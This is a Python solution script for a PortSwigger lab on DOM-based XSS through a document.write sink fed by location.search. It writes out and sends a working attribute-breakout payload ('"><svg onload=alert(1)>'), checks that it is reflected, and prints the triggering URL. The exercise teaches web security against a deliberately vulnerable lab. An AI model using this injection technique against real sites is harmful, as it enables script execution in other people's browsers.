# Lab 03 — DOM XSS in document.write sink using source location.search
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
#
# Vulnerability: Search functionality — client-side JS
# Aim:           Perform DOM-based XSS that calls alert
#
# Technique:
#   The page JS reads location.search and passes it to document.write():
#     document.write('<img src="/tracker?searchTerms=' + query + '">');
#
#   Inject "><svg onload=alert(1)> to break out of the src attribute.
#   Resulting HTML:
#     <img src="/tracker?searchTerms="><svg onload=alert(1)>">
#
# ⚠  DOM XSS: the server reflects the value in the page source, but the
#    actual JS execution happens entirely in the browser. requests cannot
#    execute JS — we verify the raw value reaches the client intact.
#
# Usage: python xss_lab03.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = '"><svg onload=alert(1)>'

if __name__ == "__main__":
    banner()
    section("LAB 03 — DOM XSS: document.write SINK / location.search SOURCE")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending payload: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "DOM XSS payload")

    print()
    print("  ➜  Open this URL in a browser to trigger JS execution:")
    print(f"     {r.url}")
    print("  ℹ  The SVG onload fires when document.write() inserts it into the DOM.")
